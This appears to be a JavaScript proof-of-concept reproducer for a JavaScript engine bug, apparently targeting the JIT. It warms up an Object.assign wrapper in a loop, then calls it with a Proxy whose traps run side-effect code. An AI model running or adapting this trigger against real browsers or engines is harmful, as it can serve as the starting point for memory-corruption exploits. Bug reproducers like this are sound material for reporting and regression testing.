function poc(a1, a2) {
    Object.assign(a1, a2);
    return Object;
}
for (let i6 = 0; i6 < 20000; i6++) {
    const v12 = {};
    poc(v12, { a: 1 });
}
let target = {};
const v19 = {};
const v35 = {
    ownKeys(a21) {
        const v24 = new Map();
        v24.set(target);
        return ["foo"];
    },
    getOwnPropertyDescriptor(a29, a30) {
        return { value: 1, enumerable: true, configurable: true };
    },
};
const v36 = new Proxy(v19, v35);
let proxy = v36;
poc(target, proxy);
